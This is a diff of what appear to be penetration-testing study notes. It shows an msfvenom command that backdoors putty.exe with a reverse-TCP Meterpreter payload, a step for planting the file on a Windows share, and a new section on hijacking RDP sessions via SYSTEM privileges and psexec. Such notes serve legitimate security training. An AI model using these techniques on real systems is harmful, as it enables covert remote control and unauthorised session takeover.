@@ -335,4 +335,5 @@ msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/revers
 The resulting `puttyX.exe` will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the `exploit/multi/handler` module from Metasploit.  
 
 ### RDP hijacking
-
+When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.  
+If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
